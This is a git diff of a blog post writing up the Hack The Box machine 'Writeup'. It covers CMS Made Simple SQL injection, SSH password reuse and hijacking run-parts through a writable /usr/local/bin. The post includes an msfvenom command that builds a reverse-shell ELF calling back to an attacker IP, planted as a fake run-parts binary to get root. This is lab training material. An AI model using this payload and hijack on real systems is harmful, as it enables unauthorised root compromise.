@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Writeup - Hack The Box
-excerpt: "TBA"
-date: 2019-12-31
+excerpt: "Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to `/usr/local` and I can write a binary payload in there that gets executed by run-parts when I SSH in because it's called without the full path. Another nice box by jkr."
+date: 2019-10-12
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-writeup/writeup_logo.png
@@ -10,12 +10,14 @@ categories:
   - hackthebox
   - infosec
 tags:
-  -
+  - linux
+  - sqli
+  - cms
 ---
 
 ![](/assets/images/htb-writeup-writeup/writeup_logo.png)
 
-TBA
+Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to `/usr/local` and I can write a binary payload in there that gets executed by run-parts when I SSH in because it's called without the full path. Another nice box by jkr.
 
 ## Summary
 
@@ -117,7 +119,7 @@ d4e493...
 
 My user is part of the following groups: `uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)`
 
-I ran through the standard Linux enumeration, checking permissions on files and directories, and noticed that I have write access to sub-folder inside `/usr/local`:
+I ran through the standard Linux enumeration, checking permissions on files and directories, and noticed that I have write access to folders inside `/usr/local`:
 
 ```
 jkr@writeup:~$ ls -l /usr/local
@@ -169,7 +171,7 @@ else
  - Find the filename of something that is executed by root (that filename must be executed without the full path)
  - Find the trigger for executing that command as root
 
-I thought I could use `grep` or `iptables` but that didn't work, I think it's because the programs are executed by fail2ban which is started with a modified path as per `/etc/init.d/fail2ban`:
+I thought I could use `grep` or `iptables` but that didn't work. I think it's because the programs are executed by fail2ban which is started with a modified path as per `/etc/init.d/fail2ban`:
 
 ```
 PATH=/usr/sbin:/usr/bin:/sbin:/bin
@@ -179,14 +181,17 @@ I also noticed that the `run-parts` program is executed whenever I SSH in:
 
 ![](/assets/images/htb-writeup-writeup/8.png)
 
-This is potential target for hijacking, first I will generate a reverse shell payload with msfvenom:
+> run-parts runs all the executable files named within constraints described below, found in directory  directory. Other files and directories are silently ignored.
 
+I can't make run-parts run arbitrary binaries since I can't write `/etc/update-motd.d/` but because the program is run without the full path I can write my own `run-parts` binary to `/usr/local/bin` or `/usr/local/sbin` and it will be executed instead of the real one because the directory is located in front in the PATH variable definition.
+
+For the malicious binary, I use a standard linux reverse shell payload generated with Metasploit:
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.14.7 LPORT=4444
 chmod +x ./shell
 ```
 
-Then I'll just upload the file to `/usr/local/bin/run-parts` and SSH in to trigger a callback
+I just need to upload the file to `/usr/local/bin/run-parts` and SSH in to trigger a callback and get root privileges.
 
 ![](/assets/images/htb-writeup-writeup/9.png)
 
